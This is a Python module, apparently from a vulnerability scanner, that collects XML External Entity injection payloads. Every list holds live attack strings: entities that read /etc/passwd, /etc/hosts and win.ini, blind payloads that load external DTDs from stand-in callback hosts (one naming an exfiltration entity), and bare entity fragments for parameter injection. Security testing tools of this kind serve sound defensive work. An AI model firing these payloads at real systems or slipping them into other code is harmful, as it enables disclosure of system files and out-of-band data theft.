"""
XXE payload collection with enhanced detection
"""

class XXEPayloads:
    """XXE payload collection"""
    
    @staticmethod
    def get_basic_payloads():
        """Get basic XXE payloads with unique markers"""
        return [
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE xxe [<!ENTITY xxe_marker SYSTEM "file:///etc/passwd">]><root>&xxe_marker;</root>',
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE xxe [<!ENTITY xxe_marker SYSTEM "file:///windows/win.ini">]><root>&xxe_marker;</root>',
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE xxe [<!ENTITY xxe_marker SYSTEM "file:///etc/hosts">]><root>&xxe_marker;</root>',
            '<?xml version="1.0"?><!DOCTYPE xxe_test [<!ENTITY xxe_marker SYSTEM "/etc/passwd">]><xxe_test>&xxe_marker;</xxe_test>',
            '<!DOCTYPE xxe_test [<!ENTITY xxe_marker SYSTEM "file:///etc/passwd">]><xxe_test>&xxe_marker;</xxe_test>'
        ]
    
    @staticmethod
    def get_blind_payloads():
        """Get blind XXE payloads"""
        return [
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE xxe [<!ENTITY % xxe_param SYSTEM "http://xxe-test.example.com/xxe_marker.dtd">%xxe_param;]><root>xxe_test</root>',
            '<!DOCTYPE xxe [<!ENTITY % xxe_param SYSTEM "http://xxe-callback.example.com/">%xxe_param;]><xxe>test</xxe>',
            '<?xml version="1.0"?><!DOCTYPE xxe [<!ENTITY % xxe_dtd SYSTEM "http://xxe-external.example.com/test.dtd">%xxe_dtd;%xxe_param;%xxe_exfil;]><xxe></xxe>'
        ]
    
    @staticmethod
    def get_parameter_payloads():
        """Get XXE payloads for parameter injection"""
        return [
            '<!ENTITY xxe_marker SYSTEM "file:///etc/passwd">',
            '<!DOCTYPE xxe [<!ENTITY xxe_marker SYSTEM "file:///etc/passwd">]>',
            '<?xml version="1.0"?><!ENTITY xxe_marker SYSTEM "/etc/passwd">',
            '&xxe_marker;',
            '%xxe_marker;'
        ]
    
    @staticmethod
    def get_all_payloads():
        """Get all XXE payloads"""
        payloads = []
        payloads.extend(XXEPayloads.get_basic_payloads())
        payloads.extend(XXEPayloads.get_blind_payloads())
        payloads.extend(XXEPayloads.get_parameter_payloads())
        return payloads
